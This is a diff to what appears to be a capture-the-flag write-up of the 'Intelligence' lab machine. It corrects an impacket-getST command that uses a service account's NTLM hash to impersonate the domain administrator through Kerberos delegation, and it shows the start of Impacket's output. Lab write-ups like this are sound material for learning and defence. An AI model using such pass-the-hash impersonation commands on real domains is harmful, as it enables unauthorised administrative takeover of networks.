@@ -528,7 +528,7 @@ This user is compromised
 
 # Domain admin
 ```python
-faketime -f +7h impacket-getST -dc-ip 10.129.95.154 -spn 'WWW/dc.intelligence.htb' -hashes ':3c356107d6b589fdfc215e2c3de484b5' -impersonate administrator intelligence.htb/svc_int
+faketime -f +7h impacket-getST -dc-ip 10.129.95.154 -spn 'WWW/dc.intelligence.htb' -hashes ':3c356107d6b589fdfc215e2c3de484b5' -impersonate administrator intelligence.htb/svc_int$
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
